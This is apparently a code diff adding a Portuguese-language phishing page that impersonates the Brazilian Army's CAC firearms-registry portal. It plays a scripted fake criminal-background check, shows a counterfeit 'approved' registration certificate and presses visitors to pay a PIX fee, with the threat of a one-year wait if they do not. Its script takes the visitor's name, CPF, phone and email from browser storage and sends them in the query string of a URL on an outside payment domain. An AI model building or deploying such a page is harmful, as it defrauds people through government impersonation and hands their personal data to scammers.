@@ -1,0 +1,340 @@
+<html lang="pt-br"><head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Exército Brasileiro - Aprovação do Registro CAC</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <style>
+        body { font-family: 'Poppins', sans-serif; }
+        @keyframes moveLeftRight {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+        }
+        .animate-left-right {
+            animation: moveLeftRight 2s infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e2e8f0;
+            border-top: 5px solid #166534;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        .fade-out {
+            animation: fadeOut 8s forwards;
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .fixed-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1001;
+        }
+        .certificate-container {
+            position: relative;
+            max-height: 1800px;
+            overflow-y: auto;
+        }
+        .certificate-content {
+            position: relative;
+            z-index: 1;
+            background-color: transparent;
+            width: 100%;
+            height: 100%;
+            padding: 20px;
+        }
+        .certificate-text {
+            font-family: Arial, sans-serif;
+        }
+        .background-image {
+            position: absolute;
+            top: 10%;
+            left: 0;
+            width: 100%;
+            height: 80%;
+            background-image: url('images/brasao-brasil-preto-e-branco.png');
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-size: 80%;
+            opacity: 0.2;
+            z-index: 0;
+        }
+    </style>
+</head>
+<body class="bg-white">
+    <div id="loadingScreen" class="loading-screen fade-out">
+        <div class="spinner mb-8"></div>
+        <div id="loadingStatus" class="text-lg font-semibold text-green-800 mb-4">Verificando Histórico criminal</div>
+    </div>
+
+    <div class="fixed-header">
+        <header class="bg-green-800 text-white shadow-md">
+            <div class="container mx-auto px-4">
+                <div class="flex items-center justify-center h-14">
+                    <div class="flex items-center">
+                        <img alt="Brasão do Exército Brasileiro" class="mr-3 h-10 w-auto" src="https://www.eb.mil.br/image/company_logo?img_id=40367&amp;t=1721965932372">
+                        <div>
+                            <div class="text-xs">Ministério da Defesa</div>
+                            <div class="font-bold text-sm">Exército Brasileiro</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+    </div>
+
+    <main class="py-10 mt-14">
+        <div class="bg-white shadow-lg overflow-hidden">
+            </div>
+
+            <div class="w-full p-4">
+                <div class="bg-yellow-50 p-3 mb-4 rounded-lg border border-yellow-50">
+                    <h2 class="text-[18px] font-bold text-center mb-2 text-yellow-700">REGISTRO CAC APROVADO!</h2>
+                    <ul class="list-disc list-inside text-[14px] space-y-1 text-yellow-600">
+                        <li>Efetue o pagamento da Emissão do seu CR.</li>
+                        <li>Se você gerar o PIX e <strong>não efetuar o pagamento, terá que esperar 1 ano</strong> para solicitar novamente.</li>
+                    </ul>
+                    <br>
+                    
+                    <div class="flex justify-center">
+                        <button id="paymentButton" class="bg-yellow-600 hover:bg-yellow-900 text-white font-bold py-3 px-6 rounded-[5px] text-base animate-left-right inline-flex items-center">
+                            <span>EMITIR MEU CAC</span>
+                            <i class="fas fa-arrow-right ml-2"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="w-[375px] h-[667px] relative overflow-hidden mx-auto">
+                    <img alt="Fundo colorido com formas geométricas" class="absolute inset-0 w-full h-full object-cover" src="images/Design-sem-nome-30.png">
+                    <div class="absolute inset-0 flex items-center justify-center">
+                        <div class="w-full h-full">
+                            <div class="certificate-container h-full">
+                                <div class="certificate-content certificate-text relative h-full">
+                                    <div class="background-image"></div>
+                                    <div class="relative z-10 mt-8" style="width: 90%; margin: 0 auto;">
+                                        <div class="text-center mb-4">
+                                            <p class="text-[12px] uppercase font-bold" style="margin-top: 20px; margin-bottom: 10px; color: red; animation: blink 1s infinite;">AGUARDANDO PAGAMENTO PARA CONCLUIR</p>
+                                            <style>
+                                                @keyframes blink {
+                                                    0% { opacity: 1; }
+                                                    50% { opacity: 0; }
+                                                    100% { opacity: 1; }
+                                                }
+                                            </style>
+                                            <p class="text-[10px] uppercase font-bold">Ministério da Defesa</p>
+                                            <p class="text-[12px] uppercase font-bold mt-4">Exército Brasileiro</p>
+                                            <p class="text-[14px] uppercase font-bold mt-2">Certificado de Registro</p>
+                                        </div>
+                                        <div class="flex justify-between text-[10px] mb-2">
+                                            <p>Nº CR: <strong>658493747</strong></p>
+                                            <p>Validade: 23/06/2031</p>
+                                        </div>
+                                        <div class="border border-gray-400 p-2 mb-2">
+                                            <p class="text-[8px] mb-1">NOME COMPLETO</p>
+                                            <div class="h-4 flex items-center">
+                                                <p class="text-[10px] font-bold uppercase text-left" id="nomeCompletoField">NOME NÃO DISPONÍVEL</p>
+                                            </div>
+                                        </div>
+                                        <div class="flex mb-2">
+                                            <div class="border border-gray-400 p-2 w-1/2 mr-2">
+                                                <p class="text-[8px] mb-1">CPF</p>
+                                                <div class="h-4 flex items-center">
+                                                    <p class="text-[10px] font-bold text-left" id="cpfField">000.000.000-00</p>
+                                                </div>
+                                            </div>
+                                            <div class="border border-gray-400 p-2 w-1/2">
+                                                <p class="text-[8px] mb-1">SFPC DE VINCULAÇÃO (RM)</p>
+                                                <div class="h-4 flex items-center justify-center">
+                                                    <p class="text-[10px] font-bold">5ª RM/5ª DE</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="text-[8px] mb-4">
+                                            <p>AMPARO LEGAL</p>
+                                            <p>De acordo com a Lei 10.826, de 22 Dez 2003 e Decreto 9.846, de 25 Jun 2019. Este registro permite apenas o armazenamento da arma na residência e o transporte até o clube de tiro ou local de caça autorizado.</p>
+                                        </div>
+                                        <div class="border-t-2 border-dashed border-gray-300 pt-2">
+                                            <div class="flex">
+                                                <div class="w-1/2 pr-3">
+                                                    <img alt="QR Code falso para fins de demonstração" class="w-full" height="100" src="images/Design-sem-nome-31.png" width="100">
+                                                </div>
+                                                <div class="w-1/2 text-[8px]">
+                                                    <p class="font-bold mb-1">ATIVIDADES AUTORIZADAS</p>
+                                                    <p class="mb-2">Colecionamento - Tiro Desportivo</p>
+                                                    <div class="h-8"></div>
+                                                    <p class="mb-1">Documento Assinado Eletronicamente por</p>
+                                                    <p class="font-bold">SFPC:</p>
+                                                    <p class="font-bold mb-2" id="locationDate">Localização indisponível, 12/11/2024</p>
+                                                    <p>QR Code Vio</p>
+                                                    <p>A Autenticidade do SisCORe</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <br>
+            </div>
+        
+    </main>
+
+    <footer class="bg-green-900 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">O EXÉRCITO</h3>
+                    <ul class="space-y-2">
+                        <li><a class="hover:underline" href="#">Missão e Visão</a></li>
+                        <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
+                        <li><a class="hover:underline" href="#">Organização</a></li>
+                        <li><a class="hover:underline" href="#">História</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">SERVIÇOS</h3>
+                    <ul class="space-y-2">
+                        <li><a class="hover:underline" href="#">CAC</a></li>
+                        <li><a class="hover:underline" href="#">Alistamento</a></li>
+                        <li><a class="hover:underline" href="#">Concursos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">TRANSPARÊNCIA</h3>
+                    <ul class="space-y-2">
+                        <li><a class="hover:underline" href="#">Acesso �&nbsp; Informação</a></li>
+                        <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">CONTATO</h3>
+                    <ul class="space-y-2">
+                        <li><a class="hover:underline" href="#">Ouvidoria</a></li>
+                        <li><a class="hover:underline" href="#">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-3 text-lg">REDES SOCIAIS</h3>
+                    <div class="flex space-x-4">
+                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300 text-2xl"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="bg-green-950 text-white text-sm py-3 text-center">
+        Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
+    </div>
+
+    <script>
+        const loadingStatus = document.getElementById('loadingStatus');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const paymentButton = document.getElementById('paymentButton');
+
+        const statusMessages = [
+            "Verificando Histórico criminal",
+            "Buscando registros de trabalhos",
+            "Registro Aprovado!",
+            "Finalizando verificação"
+        ];
+
+        let currentStatus = 0;
+
+        function updateStatus() {
+            loadingStatus.textContent = statusMessages[currentStatus];
+            currentStatus = (currentStatus + 1) % statusMessages.length;
+        }
+
+        const statusInterval = setInterval(updateStatus, 2000);
+
+        setTimeout(() => {
+            clearInterval(statusInterval);
+            loadingScreen.style.display = 'none';
+        }, 8000);
+
+        // Recuperar dados do localStorage
+        const cpf = localStorage.getItem('cpf') || 'CPF não disponível';
+        const nomeCompleto = localStorage.getItem('nomeCompleto') || 'Nome não disponível';
+        const telefone = localStorage.getItem('telefone') || 'Telefone não disponível';
+        const email = localStorage.getItem('email') || 'Email não disponível';
+
+        // Construir a URL com os dados
+        const pagSeguroUrl = `https://pay.portal-cac-registro.org/lqv130zBYNOGxbj?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
+
+        paymentButton.addEventListener('click', () => {
+            window.location.href = pagSeguroUrl;
+        });
+
+        function formatDate(date) {
+            const day = String(date.getDate()).padStart(2, '0');
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const year = date.getFullYear();
+            return `${day}/${month}/${year}`;
+        }
+
+        function formatCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        }
+
+        async function updateLocationAndDate() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                const city = data.city;
+                const region = data.region_code;
+                const currentDate = new Date();
+                const formattedDate = formatDate(currentDate);
+                
+                document.getElementById('locationDate').textContent = `${city}/${region}, ${formattedDate}`;
+            } catch (error) {
+                console.error('Error fetching location:', error);
+                const currentDate = new Date();
+                const formattedDate = formatDate(currentDate);
+                document.getElementById('locationDate').textContent = `Localização indisponível, ${formattedDate}`;
+            }
+        }
+
+        function loadUserData() {
+            const cpf = localStorage.getItem('cpf') || '000.000.000-00';
+            const nomeCompleto = localStorage.getItem('nomeCompleto') || 'Nome não disponível';
+
+            document.getElementById('cpfField').textContent = formatCPF(cpf);
+            document.getElementById('nomeCompletoField').textContent = nomeCompleto.toUpperCase();
+        }
+
+        updateLocationAndDate();
+        loadUserData();
+    </script>
+
+</body></html>
